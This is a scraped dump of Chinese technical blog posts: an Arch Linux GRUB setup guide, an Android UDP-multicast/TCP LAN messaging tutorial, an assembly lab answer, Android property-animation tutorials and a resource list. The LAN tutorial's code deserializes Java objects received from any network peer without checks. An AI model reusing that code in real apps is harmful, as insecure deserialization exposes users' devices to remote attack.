安装grub包： 1pacman -S grub 部署grub： 1grub-install --target=i386-pc /dev/sdx （将sdx换成你安装的硬盘） 注意这里的sdx应该为硬盘（例如/dev/sda），而不是形如/dev/sda1这样的分区。 生成配置文件： 1grub-mkconfig -o /boot/grub/grub.cfg 如果你没有看到如图所示的提示信息，请仔细检查是否正确完成上面的过程。常见问题如下： 如果报warning failed to connect to lvmetad，falling back to device scanning.错误。参照wiki中搜索关键词use_lvmetad所在位置，简单的方法是编辑/etc/lvm/lvm.conf这个文件，找到use_lvmetad = 1将1修改为0，保存，重新配置grub。 有部分同学反馈后面安装grub包的时候报如下错误： 是因为实际是UEFI引导的系统没有正确挂载boot分区。首先检查你是不是按照\bBIOS方式安装的系统，二是检查是否正确\b挂载/mnt/boot。\b正确配置好boot分区之后可以从“挂载分区”这步开始重做。 如果为EFI/GPT引导方式： 安装grub与efibootmgr两个包： 1pacman -S grub efibootmgr 部署grub： 1grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub 生成配置文件： 1grub-mkconfig -o /boot/grub/grub.cfg 提示信息应与上面的图类似，如果你发现错误，请仔细检查是否正确完成上面的过程。 如果报warning failed to connect to lvmetad，falling back to device scanning.错误。参照这篇文章，简单的方法是编辑/etc/lvm/lvm.conf这个文件，找到use_lvmetad = 1将1修改为0，保存，重新配置grub。 如果报grub-probe: error: cannot find a GRUB drive for /dev/sdb1, check your device.map类似错误，并且sdb1这个地方是你的u盘，这是u盘uefi分区造成的错误，对我们的正常安装没有影响，可以不用理会这条错误。 安装后检查如果你是多系统，请注意上面一节中对os-prober这个包的安装。 强烈建议使用如下命令检查是否成功生成各系统的入口，如果没有正常生成会出现开机没有系统入口的情况： 1vim /boot/grub/grub.cfg 检查接近末尾的menuentry部分是否有windows或其他系统名入口。下图例子中是Arch Linux入口与检测到的windows10入口（安装在/dev/sda1），具体情况可能有不同： 如果你没有看到Arch Linux系统入口或者该文件不存在，请先检查/boot目录是否正确部署linux内核： 12cd /bootls 查看是否有initramfs-linux-fallback.img initramfs-linux.img intel-ucode.img vmlinuz-linux这几个文件，如果都没有，说明linux内核没有被正确部署，很有可能是/boot目录没有被正确挂载导致的，确认/boot目录无误后，可以重新部署linux内核： 1pacman -S linux 再重新生成配置文件，就可以找到系统入口。 如果你已经安装os-prober包并生成配置文件后还是没有生成其他系统的入口： 你目前处的U盘安装环境下有可能无法检测到其他系统的入口，请在下一步中重启登陆之后重新运行：1grub-mkconfig -o /boot/grub/grub.cfg 如果还没有生成其他系统的入口，请参照： https://wiki.archlinux.org/index.php/GRUB/Tips_and_tricks#Combining_the_use_of_UUIDs_and_basic_scripting 编辑配置文件手动添加引导的分区入口。 重启接下来，你需要进行重启来启动已经安装好的系统，执行如下命令： 1exit 如果挂载了/mnt/boot，先umount /mnt/boot，再umount /mnt，否则直接umount /mnt：123umount /mnt/bootumount /mntreboot 注意这个时候你可能会卡在有两行提示的地方无法正常关机，长按电源键强制关机即可，没有影响。 关机后拔出U盘，启动顺序会自动以硬盘启动，如果一切顺利，那么你将会看到下面的界面： 启动时有可能会有输出信息显示在这里，直接回车就可以了。 输入root，再输入之前设置的密码，显示出命令提示符，恭喜你，你已经成功安装ArchLinux！ 安装后配置虽然系统安装好了，但是还没有进行基本配置和安装图形界面，所以接下来我们要进行一些必须的配置和图形界面的安装。 请见下一篇文章：ArchLinux安装后的必须配置与图形界面安装教程 特别感谢评论区中Senrey_Song、YKun、imzhwk、haonan mao、Lichen Zhang、回风、Nee、Wafer、LIU SHIKE、Charles、MegatonZed、beer!code!、禾七、Unira、arc、ZhiChao Li、多听音乐多喝水、AirLongdian、若尘对于本教程内容的宝贵建议与指正。 leccesg、Sophie Spivey、竹林里有冰、王心语通过邮件提供的宝贵建议。 最后如果觉得这篇教程对你有帮助，可以移步我的知乎回答下点个赞，让更多的人可以看到这篇教程，你的支持是我最大的动力： Arch Linux 怎么安装？ - viseator的回答 - 知乎 https://www.zhihu.com/question/21427410/answer/171867330 同时，如果你是想要从事计算机方向的新人，非常推荐看看我的分享：： 从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活 也欢迎关注我的微信公众号VirMe： 如果安装过程中遇到问题，可以直接在下方评论区/公众号留言或邮件viseator@gmail.com（尽量附上错误信息），我会尽力回复解决。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.viseator.com/tags/Linux/"},{"name":"Arch","slug":"Arch","permalink":"https://www.viseator.com/tags/Arch/"}]},{"title":"Android利用UDP、TCP进行局域网数据传输","date":"2017-05-11T07:58:06.000Z","path":"2017/05/11/android_lan_messages/","text":"写在前面在团队内部的hackweek中实现了一个在局域网环境中（同一个wifi下）进行的卡片收发小游戏，踩了一些关于局域网内通信的坑，这篇博文就用来整理一下整个过程的思路，完整代码地址。 实现思路在整个过程中利用到了UDP与TCP两种传输层协议，两者的特性决定了使用上的不同。 简单地说，UDP非面向连接，不需要先与目标建立连接，所以UDP不提供可靠的数据传输，也不能保证数据准确无误地到达目的地，但UDP的优势在于它可以迅速传送大量信息，传输性能比较好。 而TCP是面向连接的协议，需要经过三次握手与目的地址建立一个稳定的连接，可以保证数据准确、完整地到达。但是它的传输效率就没有UDP那么高。 首先，为了数据传输的稳定和准确性，在传送主要数据部分我们必需使用TCP来建立一个点对点的稳定的连接来传输主要数据。 但是，为了建立一个TCP连接，请求的一方必须要知道被请求一方（下面简称服务方）的IP地址。而在局域网中，如果我们想要实现每个人连接局域网以后马上可以收发信息，由于每次加入时分配到的IP地址并不是固定的也无法提前得知，所以我们需要使用其他的办法先获取到服务方的IP地址。 这时就要利用到UDP协议的组播特性了，组播可以让设备都加入一个预设好的组，然后就可以向这个组中发送数据包，只要加入了这个组的设备都可以收到这个数据包。这样只要所有的设备都提前加入了同一个组，不需要互相知道IP地址就可以交换数据，那么我们应该如何利用这样的特性呢？ 结合我们的实际需求，游戏过程是每个人可以向所有人发送一个只有标题的匿名卡片（这个过程就符合UDP组播的特性），如果感兴趣的人就可以点击收到的卡片来打开这个卡片查看具体内容（这个过程就需要我们建立TCP连接来传输数据）。 所以我们就有了思路，向所有人发送卡片的过程使用UDP进行组播，数据包中除了包含标题信息还要包含一个发送人的IP地址以及一个Mac地址作为ID（考虑到重新连接后地址发生改变的问题），当所有人收到这个卡片以后需要建立连接的时候就可以得到发送人的IP来进行TCP连接。 下面我们来实现这个过程。 具体实现组播我们定义一个ComUtil类来处理组播 加入组12345678910111213public static final String CHARSET = \"utf-8\";private static final String BROADCAST_IP = \"224.0.1.2\"; //IP协议中特殊IP地址，作为一个组，用来集合加入的所有客户端public static final int BROADCAST_PORT = 7816; //广播目的端的端口号private static final int DATA_LEN = 4096;private MulticastSocket socket = null;private InetAddress broadcastAddress = null;//当前设备在局域网下的IP地址byte[] inBuff = new byte[DATA_LEN];private DatagramPacket inPacket = new DatagramPacket(inBuff, inBuff.length);//用于接受对象的packetprivate DatagramPacket outPacket = null;//用于发送对象的packetprivate Handler handler;public ComUtil(Handler handler) &#123; this.handler = handler;//回调使用Handler机制&#125; 12345678910111213public void startReceiveMsg() &#123; try &#123; socket = new MulticastSocket(BROADCAST_PORT);//打开一个组播Socket broadcastAddress = InetAddress.getByName(BROADCAST_IP);//需要进行一步转换来使用String类型的IP地址 socket.joinGroup(broadcastAddress);//加入一个组 outPacket = new DatagramPacket(new byte[0], 0, broadcastAddress, BROADCAST_PORT);//用于发送数据包的DatagramPacket &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; //下面两行用于下文中的开始接收广播 Thread thread = new Thread(new ReadBroad()); thread.start();&#125; 注释应该讲得比较清楚了，这里要注意的是UDP数据的收发需要使用一个DatagramPacket来进行。可以理解为一个数据包。 接收组播信息上面的代码最后两行新建了一个线程用于接收组播信息，具体代码如下： 123456789101112131415class ReadBroad implements Runnable &#123; public void run() &#123; while (true) &#123; try &#123; socket.receive(inPacket); Message message = new Message(); message.what = BROADCAST_PORT; message.obj = inBuff; handler.sendMessage(message); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 进行了一个无限循环，进行到第5行时如果没有收到广播的DatagramPacket会一直处于阻塞状态，收到一个DatagramPacket后就会通过Handler来转发出去，在Handler所在线程来处理这个数据包。之后再进行循环不断地接收并处理数据包。 发送组播信息123456789101112131415161718public void broadCast(final byte[] msg) &#123; Thread thread = new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; outPacket.setData(msg); //数据来源为外部，类型是二进制数据 socket.send(outPacket);//向组中发送该数据包 &#125; catch (IOException ex) &#123; ex.printStackTrace(); if (socket != null) &#123; socket.close(); &#125; &#125; &#125; &#125;); thread.start();&#125; 这个方法由外部调用，传入一个二进制数组数据通过setData()放在数据包中向组中的所有成员发送。成员通过上一节的接收方法接收到的就会是同样的数据包。 数据处理建立了组播的工具，下一步就要建立一个数据对象来进行信息的交换。由于数据包中的数据只能是以字节码的形式存在，所以我们设计的数据对象一定要是可序列化的（也就是实现了Serializable接口的），再通过流工具进行转换。 1234567public class UDPDataPackage implements Serializable &#123; private String ipAddress; private String macAddress; private String title; private String id; ...&#125; 在这个简单的JavaBean中只定义了四个简单数据。 我们将自己的信息设置后就可以通过如下方法转换成一个字节数组再通过上面的广播方法来发送： 1comUtil.broadCast(ConvertData.objectToByte(new UDPDataPackage(...))); //发送数据 123456789101112//通过流来进行的序列化public static byte[] objectToByte(Object object) &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream; try &#123; outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(object); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return byteArrayOutputStream.toByteArray();&#125; 同样的，在接收到数据以后可以反序列化来得到原对象： 1234567891011public static Object byteToObject(byte[] bytes) &#123; ByteArrayInputStream byteInputStream = new ByteArrayInputStream(bytes); Object object = null; try &#123; ObjectInputStream objectInputStream = new ObjectInputStream(byteInputStream); object = objectInputStream.readObject(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return object;&#125; 这样，我们就可以从这个对象中获取想到的IP地址等信息了。 建立TCP连接传输数据想要建立TCP连接，需要客户端与服务端两端的配合，我们现在已经获取到了需要建立连接的IP地址，下面我们要做的是与这个地址的服务端建立连接再传输数据。服务端需要一直运行来随时准备接受可能的请求。 由于我们同一个设备既要作为客户端，也要作为服务端，所以要编写两个类。 服务端12345public void startServer(Handler handler) &#123; this.handler = handler;//利用handler进行处理 thread = new Thread(new RunServer()); thread.start();//另开一个线程接收连接请求&#125; 1234567891011121314151617181920212223242526272829303132333435class RunServer implements Runnable &#123; @Override public void run() &#123; ServerSocket serverSocket = null; try &#123; serverSocket = new ServerSocket();//初始化一个ServerSocket serverSocket.setReuseAddress(true); serverSocket.bind(new InetSocketAddress(SERVER_PORT));//与端口绑定 &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; while (true) &#123; try &#123; Socket socket = serverSocket.accept();//利用accept方法获得socket InputStream inputStream; inputStream = socket.getInputStream();//获取输入流（来源自客户端） ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);//转换为对象输入流 //获取udpDataPackage对象 UDPDataPackage udpDataPackage = (UDPDataPackage) objectInputStream.readObject(); OutputStream outputStream = socket.getOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream); objectOutputStream.writeObject(udpDataPackage);//将数据包写入输出流传送给客户端 objectOutputStream.flush();//刷新流 objectOutputStream.close(); outputStream.close(); objectInputStream.close(); inputStream.close(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 解释见注释。 客户端1234567public void sendRequest(String ipAddress, UDPDataPackage udpDataPackage, Handler handler) &#123; this.ipAddress = ipAddress;//即为之前获取到的IP地址 this.udpDataPackage = udpDataPackage; this.handler = handler; thread = new Thread(new SendData()); thread.start();&#125; 12345678910111213141516171819202122232425262728293031323334class SendData implements Runnable &#123; @Override public void run() &#123; Socket socket = null; try &#123; socket = new Socket(ipAddress, SERVER_PORT);//新建一个socket socket.setReuseAddress(true); socket.setKeepAlive(true);//设置socket属性 socket.setSoTimeout(5000);//设置超时 //获得一个对象输出流 OutputStream outputStream = socket.getOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream); objectOutputStream.writeObject(udpDataPackage);//将请求包写入输出流（传送给服务端） //获取服务端返回的流 InputStream inputStream = socket.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); udpDataPackage dataPackage = (udpDataPackage) objectInputStream.readObject();//获取到返回的数据对象 //转发给handler进行处理 Message msg = new Message(); msg.what = SERVER_PORT; msg.obj = dataPackage; handler.sendMessage(msg); &#125; catch (SocketTimeoutException e) &#123; try &#123; if (socket != null) socket.close(); &#125; catch (IOException e1) &#123; e1.printStackTrace(); &#125; sendRequest(ipAddress, udpDataPackage, handler); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 解释见注释。 可以看见TCP连接还是比较简单的，设置好socket并获取到输入输出流以后就可以把服务端当作本地流一样操作，具体的网络通信实现过程被隐藏了，有了流以后就可以进行所有能对流进行的操作了。到这里，我们要实现的局域网数据传输已经完成了。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"Network","slug":"Network","permalink":"https://www.viseator.com/tags/Network/"}]},{"title":"王爽汇编语言第三版实验9 双循环实现","date":"2017-04-10T12:44:49.000Z","path":"2017/04/10/assembly_wang_lab_9/","text":"编程：在屏幕中间分别显示绿色、绿底红色、白底蓝色的字符串welcome to masm!。 效果图： 采用了双循环嵌套的写法，外层控制输出行数，内层逐字符读取ASCII码与对应行的属性。 把loop s1改为loop s2有惊喜哦 所有实验答案在这里 123456789101112131415161718192021222324252627282930313233343536373839assume cs:code,ss:datacode segment mov ax,0b800h mov ds,ax mov bx,1760 mov ax,data mov ss,ax mov si,0 mov bp,0 mov cx,3s1: mov ss:[19],cx mov si,0 mov cx,16s2: mov di,si add di,di mov al,ss:[si] mov [bx+64+di],al mov al,ss:[16+bp] mov [bx+65+di],al inc si loop s2 inc bp add bx,160 mov cx,ss:[19] loop s1 mov ax,4c00h int 21hcode endsdata segment db &#39;welcome to masm!&#39; db 00000010b,00100100b,01110001b dw 0data endsend","tags":[{"name":"Assembly","slug":"Assembly","permalink":"https://www.viseator.com/tags/Assembly/"}]},{"title":"Android PropertyAnimation 属性动画（二）弹跳小球实例","date":"2017-04-02T02:08:31.000Z","path":"2017/04/02/android_property_animation_2/","text":"前言GitHub完整代码 上篇博客简单介绍了属性动画的原理，这篇博客将会以一个简单的实例来运用上之前讲的内容，并对Animator的几个回调方法进行讲解。 目标是自定义一个View，在画布上绘制一个小球，点击屏幕后小球从顶部自由下落，落到底边后反弹，反弹损失一半的能量，也就是说小球只能上升到下落时一半的高度，再重复这个过程直到退出程序。如图： 创建自定义View首先我们要创建一个自定义View，这里我就采用继承LinearLayout的方式来创建这个View，但要注意LinearLayout默认是不绘制自身的，需要在onDraw()方法之前适当的时候调用setWillNotDraw(false);令其进行绘制。 在继承LinearLayout的同时我们要实现全部三个构造方法，否则xml文件的预览解析会出现问题： 1234567891011public VView(Context context) &#123; super(context);&#125;public VView(Context context, AttributeSet attrs) &#123; super(context, attrs);&#125;public VView(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr);&#125; 创建好自定义View后，我们就可以在对应的layout xml布局文件中用完整包名+类名的方式使用我们的自定义View： 1234&lt;com.viseator.viewtest.VView android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" /&gt; 同时，我们在绘制之前的onMeasure()方法中调用setWillNotDraw(false);使自定义View可以绘制： 123456@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setWillNotDraw(false); setOnClickListener(this); super.onMeasure(widthMeasureSpec, heightMeasureSpec);&#125; 这里也调用了setOnClickListener()注册之后的点击事件。 绘制小球的绘制1234567891011121314151617181920private ValueAnimator animator;public static final int radius = 50;private int xPos = radius;private int yPos = radius;private Paint paint = new Paint();@Overrideprotected void onDraw(Canvas canvas) &#123; super.onDraw(canvas); if (animator == null) &#123; canvasHeight = canvas.getHeight() - radius; paint.setColor(getResources().getColor(R.color.Gray)); paint.setAntiAlias(true); &#125; drawCircle(canvas);&#125;void drawCircle(Canvas canvas) &#123; canvas.drawCircle(xPos, yPos, radius, paint);&#125; 这里第10行对是否是第一次绘制进行判断并将画布大小保存到canvasHeight供之后的绘制使用（之后的绘制的坐标需要相对于画布的坐标）并设置paint的属性。 drawCircle()方法也非常简单，只是调用canvas提供的drawCircle()方法指定位置与半径和之前设置的paint，调用后就会在屏幕上的对应位置绘制一个小球。 下落动画的绘制下面就要让小球“动”起来，其实并不是小球发生了移动，只是我们不停地改变小球绘制的位置，当绘制的速率（帧率）大于24帧时的，就在视觉上变成了流畅的动画。也就是说，我们需要使用Animator连续地改变小球的位置，为了实现加速的效果，位置的改变速率应该随时间增加，也就是需要我们上一篇博客提到的Evaluator来实现。 animator的初始化123456789void init(int start, int end) &#123; animator = ValueAnimator.ofInt(start, end); animator.setDuration(1000); animator.setRepeatCount(ValueAnimator.INFINITE); animator.setRepeatMode(ValueAnimator.RESTART); animator.setInterpolator(new AccelerateInterpolator(rate)); animator.addUpdateListener(this); animator.addListener(this);&#125; 写成一个初始化方法便于重新初始化。 第2行将传入的值区间的开始与结束值作为参数获得了一个值为int的ValueAnimator。 第3行设置了动画的时间为1秒。 第4、5行分别设置了动画的重复次数为无限次，重复模式为重新开始，顾名思义，动画可以重复进行，重新开始的重复模式意味着一次动画结束之后数值重新从start到end进行改变，也可以设置重复的模式为反向，即一次动画结束之后数值从end到start变化。 第六行为animator设置了一个库中提供的AccelerateInterpolator即加速插值器，这就是我们实现加速效果的关键，上篇之中已经看过它的源码，默认时返回的最终动画进行百分比是时间百分比的平方，达到了位置随着时间的平方变化，也就是实现了加速下落的效果。 第7、8两行分别为animator设置了一个UpdateListener用于监听数值变化，一个Listener用于监听animator本身开始、停止、重复。 完成下落动画创建好了ValueAnimator，下一步就是在适合的时候在画布上重新绘制位置参数被animator改变后的小球。注意到我们之前小球的y坐标存储在yPos变量中，我们只要适时令yPos等于改变后的值再通过invalidate()方法进入onDraw()方法让View按小球的参数重新进行绘制就可以了。 animator的ValueAnimator.AnimatorUpdateListener为我们提供了一个及时刷新View的时机，之前为animator注册一个UpdateListener之后，每当animator的值发生改变时，onAniamtionUpdate()就会被回调。 那我们就可以在这个回调方法中为yPos设置新的值并令View重新绘制： 12345@Overridepublic void onAnimationUpdate(ValueAnimator animation) &#123; yPos = (int) animation.getAnimatedValue(); invalidate();&#125; 这样，我们只要启动animator令它的值开始变化，就会不断地调用onAnimationUpdate()重绘View： 123456@Overridepublic void onClick(View v) &#123; init(radius, canvasHeight); animationHeight = canvasHeight + radius; animator.start();&#125; start()方法令animator开始。 到这里，我们已经可以看到点击屏幕后小球下落到底部并停止的效果。 回弹效果实现我们之前已经为animator设置了无限重复，并且模式为重新开始，那么要做到回弹的效果，就要在小球落到底边（动画完成）之后，为小球设置新的初始值与最终值，让小球从最低点回到落下时一半的高度。高度数据我们在onClick()中的第4行（上面代码）已经初始化为了相对于画布的高度，之后再使用时只需把它除2就可以表示圆心距底边的高度了。 Animator.AnimatorListener为我们提供了一系列方法用于监听animator状态的变化（而不是数值）： （除金色为Android 8新增外）依次为动画取消，动画结束，动画开始重复，动画开始。 这里我们就需要在onAnimationReapt()回调中为动画设置新的初值与结束数值： 123456789101112131415@Overridepublic void onAnimationRepeat(Animator animation) &#123; ValueAnimator vAnimation = (ValueAnimator) animation; if (isDown) &#123; animationHeight = (int) (animationHeight * 0.5); &#125; isDown = !isDown; if (isDown) &#123; vAnimation.setIntValues(canvasHeight - animationHeight, canvasHeight); vAnimation.setInterpolator(new AccelerateInterpolator()); &#125; else &#123; vAnimation.setIntValues(canvasHeight, canvasHeight - animationHeight); vAnimation.setInterpolator(new DecelerateInterpolator()); &#125;&#125; 回调参数中的animation就是回调这个函数的animator，第3行对其进行一个类型转换。 这里我们使用了一个isDown参数来判断是否是下落过程，如果上个动画是下落过程，就将animationHeight减半。 第7行把isDown置反，再根据isDown的判断使用setIntValues()方法为animator设置新的范围，使用setInterpolator()方法设置新的插值器，注意上升时使用的应该是DecelerateInterpolater减速上升。 这样在新的动画开始时属性改变的范围就得到了改变，也就使得小球可以反弹了。 为了让每一次点击时动画都可以重新开始，在onClick()方法中加入几行初始化代码： 12345678910@Overridepublic void onClick(View v) &#123; if (animator != null) &#123; animator.end(); &#125; init(radius, canvasHeight); animationHeight = canvasHeight + radius; isDown = true; animator.start();&#125; 这里第3-5行让如果存在的animator停止，否则新动画无法启动。 下篇博客将会从源码角度继续探索animator的实现原理和更高级的一些特性。 GitHub完整代码","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"UI","slug":"UI","permalink":"https://www.viseator.com/tags/UI/"},{"name":"Animation","slug":"Animation","permalink":"https://www.viseator.com/tags/Animation/"}]},{"title":"Android PropertyAnimation 属性动画（一）初探","date":"2017-03-26T06:14:45.000Z","path":"2017/03/26/android_property_animation_1/","text":"前言相对于静态的页面，动画往往能更直观地表达所需的信息，在UI开发过程中起着相当大的作用。 Android为我们提供了一系列实现动画效果的方法，PropertyAnimaiton是最常见也是最实用的一种，如同它的名字一样，它的实现方式是通过改变对象的一系列属性值来改变对象的状态， 例如动态地改变绘制的位置就可以实现绘制物体的移动效果，动态地改变对象的显示状态可以实现闪烁效果。 Animator概览Android提供的实现属性动画的工具是android.animation.Animator这个类，它的使用需要配合animation包下的其他工具类，这个类的功能是什么，我们要如何使用它来实现属性动画呢？ 我们可以将Animator理解为Android为我们提供的一个按我们的需要在一定时间段内连续地计算并返回值的工具，这个值可以是通用的整型、浮点型，也可以是我们自定义的类型。 我们可以设置返回值的范围，并可以控制值变化的快慢，例如实现自由落体下落的物体时我们需要让高度值以一个越来越快的速度降低。 这里的连续需要注意，实际上是不可能产生真正意义上的连续值的，但是如果在绘制过程中计算这个值的速度小于绘制一帧所需要的时间，那么我们就可以在视觉上认为这个值是在连续改变的。这一点也是理解其作用的关键：我们很难去写出一个可以随时获取连续值的工具，而Animator正是一个满足我们这个需求的一个通用工具。 通过将Animator与View的绘制过程结合，就可以实现绝大多数的动画效果， 但是Animator也不只局限在使用在绘制动画，只要是有相似需求的地方都可以使用它来实现， 同时由于属性动画只针对属性进行修改，与被修改对象之前几乎没有耦合，不需要对被修改对象作出改变，可以设置方式也多种多样，这些都是动画的另一种实现方法ViewAnimator所无法做到的，所以我属性动画是现在实现动画效果的普遍做法。 使用AnimatorAnimator子类下面就来看看如何使用Animator满足我们的需求。 我们使用Animator可以分为两个步骤，一是进行数值的计算，二是将计算出的数值设置到对应的对象上。而Animator有着三个子类：ValueAnimator ObjectAnimator AnimatorSet。 ValueAnimator实现了上述过程的第一个步骤：进行数值的计算。第二个步骤则需要我们重写它的回调在值发生改变时候手动地为对象更新属性值。 ObjectAnimator则在其基础上进行了进一步的封装，加入了一些方法使得它可以绑定一个对象，在数值改变的同时对对象的属性进行更新。 AnimatorSet可以对Animator进行组合，让它们之间进行联动，例如可以设置一个动画根据另一个动画的状态来决定是否开始、暂停或停止。 可以看到，ValueAnimator提供了一个Animator最核心的内容，也是使用中最为灵活的一个。ObjectAnimator由于绑定了相应的对象，在使用上会受一些限制。AnimatorSet专用于需要组合动画的场景。 ValueAnimator在这篇博客中，我们关注最为核心的ValueAnimator。 关键属性ValueAnimator对象内部维护了一系列属性来保存所需的各种信息。 Duration：动画的持续时间，通过setDuration()方法设置 Repeat count and behavior：重复计数与重复模式，我们可以通过设置这两个属性来控制动画是否重复以及重复的次数，通过setRepeatCount()与setRepeatMode()方法设置 Frame refresh delay：帧刷新延迟，也就是计算两帧动画之间的间隔时间，但这个时间只是Animator尽力去保持的值，具体的间隔时间会由于系统负载与性能的不同而不同，同时设置它的方法为一个静态方法：ValueAnimator.setFrameDelay()，会被设置到所有的Animator上，这是因为这些Animator都在同一个时间循环中。这个属性也有可能会被忽略如果动画系统采用了内部的计时来源，例如vsync来计算属性。同时这个方法需要在与start()方法相同的进程中调用 Time interpolation：时间插值器，是我们实现不同动画效果的关键，每一时刻所返回的数值由它决定，后文会详细讲 初始化与TypeEvaluatorValueAnimator对象的构造函数只由内部使用，获取ValueAnimator对象的方法是调用它的工厂方法： ValueAnimator.ofArgb() ValueAnimator.ofInt() ValueAnimator.ofFloat() ValueAnimator.ofObject() ValueAnimator.ofPropertyValuesHolder() //本篇未涉及，下一篇进行讲解 前三个可以看作是ValueAnimator为我们提供的初始化方式，它们的参数都是对应类型的长度可变参数:(Type ...values)，我们需要提供一个以上的参数，ValueAnimator最终提供的值会在这些值之前变动。 一般情况下这里提供的Argb（用于颜色值的变化）和整型、浮点值基本可以满足我们的需求，但是某些时候我们需要结果是我们自定义的一些对象，这个时候就需要用到TypeEvaluator&lt;&gt;接口了，与这个接口对应的工厂方法是ValueAnimator.ofObject()： 12ValueAnimator ofObject (TypeEvaluator evaluator, Object... values) 这里的可变参数类型变为了Object，同时还需要我们提供一个TypeEvaluator&lt;&gt;，用于“告诉”Animator如何返回这个Object值。 TypeEvaluator&lt;&gt;接口并不复杂，只有一个方法需要我们重写： 123T evaluate (float fraction, T startValue, T endValue) startValue与endValue非常好理解，就是我们在获取Animator时指定的值的起始值和结束值。类型与返回类型一致，当然都是我们自定义的类型。 这里的fraction就是决定我们最终返回值的关键参数。我们可以把这个fraction理解为animator提供给我们的最终的数值改变的比例，以小数表示，小于0表示低于startValue，大于0表示超出endValue，0-1之间表示在startValue与endValue之间。我们要做的就是把这个值转换为在起始和结果范围之间的合适的对象值。 例如，对于基本的浮点类型，默认的FloatEvaluator是这样的： 1234public Float evaluate(float fraction, Number startValue, Number endValue) &#123; float startFloat = startValue.floatValue(); return startFloat + fraction * (endValue.floatValue() - startFloat);&#125; 可以看到，就是相当于把fraction所表示的比例“投射”到了我们所需要的数据对象上，这里是浮点类型。如果使用我们的自定义类型，我们必须为自己的类型定义这样的操作。 注意：这里要求我们必须将fraction线性地反应到对应的类型上，因为fraction反映的是最终的动画进度，我们必须如实地按照这个进度改变我们的属性，所以需要将result = x0 + t * (x1 - x0)`这样的形式反映到我们自己的对象上。 自定义了TypeEvaluator以后就可以作为参数使用在上面的obObject()工厂方法中了。 插补细分器(Interpolators)下面介绍使用ValueAnimator控制值变化过程中最为重要的一个概念：插补细分器(Interpolators)。 它实际上是一个关于时间的函数， 根据时刻的不同来返回不同的值，进而来控制最后的输出的值。那么它是如何表示的呢？ 系统为我们提供了一系列预置的Interpolators，以较常用的LinearInterpolater为例，顾名思义，它是一个线性的插补细分器，意味着输入与输出呈线性关系： 123public float getInterpolation(float input) &#123; return input;&#125; 输入输出的关键函数就是这个getInterpolation()了，可以看到，参数与返回值都是float类型，input的值在0-1之间，结合前面，我们可以很容易理解，这个input就是一个以0-1之间的小数表示的过去的时间值，例如整个动画是1000ms，当input为0.25的时候意味着现在的时间过去了250ms。 而返回值就是经过我们的转换，表示出的动画应该进行的时间的比例，这里由于是线性的，所以可以直接返回input，这个值最后会到哪里呢？自然就是给我们前面介绍的TypeEvaluator。下面一段源码展示了这个过程： 12345if (mInterpolator != null) &#123; fraction = mInterpolator.getInterpolation(fraction);&#125;return mEvaluator.evaluate(fraction, mFirstKeyframe.getValue(), mLastKeyframe.getValue()); 作为getInterpolation()参数的fraction代表着过去的时间比例，这里调用我们设置的Interpolator来更新这个fraction，现在这个fraction表示的就是动画已经进行的比例，下一步就要根据它来获取对应的对象值（调用了我们之间谈到过的evaluate()方法，这里的KeyFrame的概念会在之后的博客讲到），后面的两个参数就是传递给evaluate的起始与结束范围。 最终，我们就获得了一个按照我们设定的Interpolator返回的动画属性值。 如果想要实现加速效果呢？Android同样为我们提供了现成的AccelerateInterpolator： 1234567public float getInterpolation(float input) &#123; if (mFactor == 1.0f) &#123; return input * input; &#125; else &#123; return (float)Math.pow(input, mDoubleFactor); &#125;&#125; 同样很简洁，这里用到了mFactor与mDoubleFactor分别表示我们在构造函数里面设置的指数值： 1234public AccelerateInterpolator(float factor) &#123; mFactor = factor; mDoubleFactor = 2 * mFactor;&#125; 如果我们设置的为1，会返回input的平方，其他值则会返回input的mDoubleFactor次方，使得动画属性可以以不同的函数曲线形式变化。 如果我们要实现自己的Interpolator呢？只需要实现TimeInterpolator接口，这个接口只需要我们实现一个getInterpolation方法。我们可以根据input值返回不同的值来返回不同的值表示动画的进度。 注意：返回值的范围不一定要在0-1之间，小于0或大小1的值可以表示超出预设范围的目标值。 这篇博客到此结束，在下一篇博客中将会以一个绘制自由落体的弹跳小球的示例来演示如何使用Animator与介绍它的回调函数。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"UI","slug":"UI","permalink":"https://www.viseator.com/tags/UI/"},{"name":"Animation","slug":"Animation","permalink":"https://www.viseator.com/tags/Animation/"}]},{"title":"学习资源收集","date":"2017-03-25T15:43:06.000Z","path":"2017/03/25/resource_general/","text":"技术分类 资源类型 标题 链接 简介 C语言 书籍 C Primer Plus 链接 C语言推荐入门书籍 算法 网站 编程练习/算法练习/面试刷题 链接 在线编程及测试网站，体验良好，题目优秀，从易到难做 数据结构与算法分析 书籍 数据结构与算法分析：C语言描述 第2版 链接 数据结构与算法分析权威书籍 算法 书籍 算法 第4版 链接 算法学习推荐书籍，强烈建议配合网课(链接)进行学习 Java 书籍 Java核心技术 卷1：基础知识（原书第10版） 链接 Java语言推荐入门书籍 Java 书籍 Effective Java中文版（第2版） 链接 Java语言推荐进阶书籍 